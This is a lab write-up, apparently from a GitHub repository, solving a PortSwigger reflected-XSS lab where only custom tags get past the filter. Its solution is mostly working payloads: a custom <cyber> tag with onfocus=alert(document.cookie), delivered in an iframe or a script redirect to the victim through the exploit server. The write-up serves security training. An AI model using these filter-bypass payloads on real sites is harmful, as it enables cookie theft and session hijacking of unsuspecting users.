## Lab Description :

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/4233f5ba-fe26-48f2-acf5-8486eea975dd)

## Solution :

 We need create a custom tag and automatically alerts document.cookie.

 > `onfocus`event , `tabindex` and `id` will work with any costom tag.

will try to create the pay load using this.

```html
<cyber tabindex="1"onfocus="alert(document.cookie)"id="a1">
```
>`<cyber>`: This is a made-up element, not a regular one like `<div>` or `<p>`.

>`tabindex="1"`: This makes it so when you press the `"Tab"` key to move around a webpage, this element is the first one to be highlighted.

>`onfocus="alert(document.cookie)"`: When you click or tab to this element, it shows a pop-up box.

>`id="a1"`: It's like a name for this element so that you can refer to it later in your code.

>In short, this custom element (<cyber>) grabs your attention first, and if you interact with it, it could potentially show your browser's cookies in a pop-up message when we are trying to acces the id.

For this first we will give this Payload to web application.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/4db553c8-a18f-470f-ad13-fef1d2d68d42)

Result-Payload incerted in web application.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/56151f67-373f-4b2b-ab2f-f380755b52e9)

For triger the alert we need type the `id` in the url using `#a1`.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/b885855c-ae80-4927-8f27-38229a84bb60)

it will triger an alert-

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/01531067-719e-4c9d-b89b-b50d0d9b7882)

we need to automatically alerts document.cookie.For that our exploit url is ready.
`https://0a2c00b404ee683f8480054f00b50038.web-security-academy.net/?search=%3Ccyber+tabindex%3D%221%22onfocus%3D%22alert(document.cookie)%22id%3D%22a1%22%3E#a1`. we need to send it inside `iframe`

Payload will be like 

```html
<iframe src="exploit url"></iframe>
```

Now go to exploit server and give the Payload.

## Payload.

```html
<iframe src="https://0a2c00b404ee683f8480054f00b50038.web-security-academy.net/?search=%3Ccyber+tabindex%3D%221%22onfocus%3D%22alert(document.cookie)%22id%3D%22a1%22%3E#a1"></iframe>
```

## alternative Payload

```html
<script>
location ='https://0a2c00b404ee683f8480054f00b50038.web-security-academy.net/?search=%3Ccyber+tabindex%3D%221%22onfocus%3D%22alert(document.cookie)%22id%3D%22a1%22%3E#a1'
</script>
```
![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/8a0b7f4c-a333-4d8f-bf27-94900355c423)

Then View exploit.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/bcbed228-4c23-42ab-ac66-33c7bf65fe95)

Then press DELIVER it to VICTIM. lab will be solved.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/ec505fb7-615d-4af6-bfcf-f76f4d87be5d)
